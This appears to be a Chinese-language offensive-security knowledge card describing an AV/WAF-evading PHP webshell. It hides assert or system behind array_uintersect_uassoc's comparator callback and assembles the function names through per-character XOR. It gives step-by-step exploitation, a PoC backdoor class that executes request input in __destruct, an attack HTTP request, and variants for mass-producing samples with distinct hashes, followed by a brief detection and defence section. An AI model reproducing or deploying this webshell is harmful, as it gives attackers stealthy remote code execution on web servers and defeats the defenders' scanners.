---
id: web-php-rce-webshell-obscure-callback-uintersect
title: 冷门回调函数作 sink：array_uintersect_uassoc 的比较器参数直接执行 assert，文件里没有 eval/assert/array_map 关键字
type: scenario
domain: web
path: web/php/rce
technique: php-webshell-obscure-callback-sink
aliases:
- array_uintersect_uassoc webshell
- 冷门回调函数免杀
- 比较器参数当函数调用
- 回调型 sink
- 异或隐藏 callable 名
tags:
- php
- webshell
- av-bypass
- obfuscation
- callback
- obscure-function
- dynamic-call
- waf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W3
  verified_at: '2026-11-08T12:55:52+08:00'
  notes: 已对照原文核对；array_uintersect_uassoc 比较器形参作 sink + 两个函数名各自异或拼接与原文 PoC 一致；已把'原文该样本在 D 盾未被判木马'改为作者断言并说明原文 D 盾截图实际是对 SQLite 样本报级别3；未执行 PHP 载荷
---

## 一句话结论

不写 `eval`/`assert`/`array_map` 这些被重点照顾的回调型函数，而用冷门数组函数的**比较器/callback 形参**来间接调用任意函数：`array_uintersect_uassoc($arr1, $arr2, $value_cmp, $key_cmp)` 中把 `$value_cmp` 设为 `assert`、把第一个数组元素设为待执行代码，PHP 在求交集时会以两个元素为参数调用 `assert(...)`，等价于代码执行；再配合异或生成 `assert` 与 `array_uintersect_uassoc` 两个函数名，文件里既无敏感函数名也无 `eval` 结构；原文称这种"冷门回调 + 异或"的组合作者未再被检测出来（属作者断言，原文未附该样本的免杀截图；原文唯一 D 盾截图是对 SQLite 载体样本仍报"变量函数"级别 3，提示单一手法需叠加使用）。

## 原理

- **回调形参就是 sink**：PHP 里凡接受 `callable` 的函数（`array_map`/`array_filter`/`array_walk`/`usort`/`uasort`/`uksort`/`array_reduce`/`array_uintersect_*`/`filter_var`/`register_shutdown_function`/`register_tick_function`/`call_user_func*`）都能把任意函数名当参数传入并在内部调用。检测规则与 WAF 往往盯的是"常见回调函数名 + 敏感 sink 名"的组合，而不是所有 callable 形参。
- **为什么 `array_uintersect_uassoc` 好用**：它需要两个比较回调（值比较、键比较），签名是 `(array $a, array $b, callable $value_cmp, callable $key_cmp)`；求交集时会遍历元素并把成对的值传给 `$value_cmp`。把 `$a = [$_POST['x']]`、`$b = ['']`、`$value_cmp = 'assert'`，则 `assert(<POST 值>, '')` 会在比较时被调用；`assert` 收到非空字符串即按代码执行（PHP 7 之前 `assert` 是函数，PHP 7/8 若未禁用仍可按字符串断言执行，必要时换成 `system` 并通过返回值/异常配合第二个比较器）。
- **函数名异或化**：`"J"^"\x2b"` = `a`、`"="^"\x49"` = `t` 之类的单字符异或，把 `assert` 拆成 6 个独立变量、把 `array_uintersect_uassoc` 拆成 23 个独立变量，再 `.` 拼接。源码里没有任何完整敏感词，字符串检索/正则完全失效；这也解释了为什么"拆解合并"（`explode`+下标）这类老办法容易失效——`explode` 的参数里仍带明文片段，而异或的每个操作数都是无关的可打印字符。
- **为什么仍然可执行**：所有拼接都在运行时完成，PHP 对"变量函数 + 变量参数"不做静态约束；`@` 抑制提示后即使断言失败也不影响后续。
- 与"取反免杀"的差别：取反是单目 `~` 对整串字节取反（结果不可打印、以十六进制转义形式落地）；本卡是**双目异或**，每个字符用一个随机可打印 key 与之异或，产物也是可打印字符，因此文件看起来更像"正常字符串运算"，且每个字符单独一个变量名，进一步打散特征。

## 触发条件

- 目标 PHP 环境保留 `assert`（PHP 7.x 默认开启；PHP 8 中 `assert` 不再接受字符串代码，需改回调为 `system`/`passthru` 等，且需让 `array_uintersect_uassoc` 的返回值/参数传递把命令喂进去）或换用其它可被形参调用的 sink；
- 文件已落地并可被 Web 访问（上传/写入/包含等前置独立）；
- 防护以静态特征（函数名、结构）为主；
- 请求参数名与代码中的取值方式一致（原文用 `$_REQUEST['css']`）。

## 利用步骤

1. 选定一个接受 callable 的冷门函数，优先考虑带多个回调形参、且在正常业务里不常用的（`array_uintersect_uassoc`、`array_udiff_uassoc`、`array_uintersect_assoc`）。
2. 用生成脚本把函数名逐字符异或（每个字符一个随机变量名），得到两段拼接表达式。
3. 构造调用：把"待执行代码"放进第一个数组，把第二个比较器指向一个合法的普通函数（如 `myfunction_key`）以满足签名。
4. 落地后用 `css=phpinfo();` 之类无害断言验证执行；成功后替换为实际命令（或把 sink 换成 `system`）。
5. 注意 PHP 8：`assert` 不再接受字符串，需改用 `system` 作为 `$value_cmp`，并把命令放在第一个数组元素，让比较器以 "命令 + 第二参数" 的形式调用（`system` 只取第一个参数）。

## PoC

```php
<?php
function myfunction_key($a, $b) {
    if ($a === $b) return 0;
    return ($a > $b) ? 1 : -1;
}

class rtHjmCdS {
    public $fHfoj;   // 待执行代码
    public $fDaGv;   // 异或拼出的 "assert"
    public $HgAjSd;   // 异或拼出的 "array_uintersect_uassoc"

    function __construct() {
        $_xlr = "J" ^ "\x2b"; $_Nbv = "V" ^ "\x25"; $_cfh = "T" ^ "\x27";
        $_PdK = "I" ^ "\x2c"; $_zJQ = "+" ^ "\x59"; $_RgD = "=" ^ "\x49";
        $this->fDaGv = $_xlr . $_Nbv . $_cfh . $_PdK . $_zJQ . $_RgD;

        $_fLd = "a" ^ "\x0";  $_wOK = "j" ^ "\x18"; $_tAH = "U" ^ "\x27";
        /* ... 其余每个字符一个独立异或 ... */
        $this->HgAjSd = $_fLd . $_wOK . $_tAH /* ... */;
    }

    function __destruct() {
        @$this->HgAjSd(array($this->fHfoj), array(''), $this->fDaGv, 'myfunction_key');
    }
}

$jfnp = new rtHjmCdS();
@$jfnp->fHfoj = $_REQUEST['css'];
```

```http
POST /1.php HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded

css=phpinfo();
```

## 变体与关联

- 变体：把 `array_uintersect_uassoc` 换成其它"不常被规则盯"的 callable 形参：`array_udiff_uassoc`、`array_uintersect_assoc`、`array_udiff_assoc`、`iterator_apply`（以 callable 处理迭代器）、`array_reduce`（回调带两个参数）。
- 变体：`__destruct` 触发时机改为 `register_shutdown_function`、`__wakeup`（反序列化）或析构即执行（脚本结束自动触发，无需显式调用）。
- 变体：异或 key 随机化 + 变量名随机化由脚本批量生成，同一模板可产出大量不同哈希的样本（同源不同形）。
- 关联：[[web-php-rce-webshell-string-not-dynamic-call-av-bypass]]（同为 `$func($arg)` 动态调用收尾，但隐藏手段是按位取反 `~` 与 `array_map`；本卡是异或 + 冷门比较器形参）。
- 关联：[[web-php-rce-webshell-business-data-carrier-obfuscation]]（把 payload 藏进业务数据结构；本卡的载荷仍来自 `$_REQUEST`，藏的是"函数名与调用点形状"）。
- 边界：PHP 8 下 `assert` 不再执行字符串，需换 `system`/`passthru` 或 `create_function`/`eval` 的替代；若 `disable_functions` 关闭了目标函数串则失效；强运行时监控仍能看到子进程/断言行为。

## 检测与防御

- 检测：AST 层面识别"变量函数调用 / callable 形参被赋值为变量 / `__destruct` 内出现动态调用"；对 `array_uintersect_*`、`array_udiff_*`、`iterator_apply` 等冷门 callable 函数出现在 Web 目录文件中提高告警级别；运行时看 PHP 是否派生子进程或触发断言。
- 防御：`disable_functions` 覆盖 `assert`、`system`、`exec`、`passthru`、`shell_exec`、`proc_open`、`call_user_func*`；生产环境禁用 `eval`/`assert` 字符串模式（`zend.assertions=-1`）；上传目录禁解析、文件内容做 AST 检测而非关键字匹配。
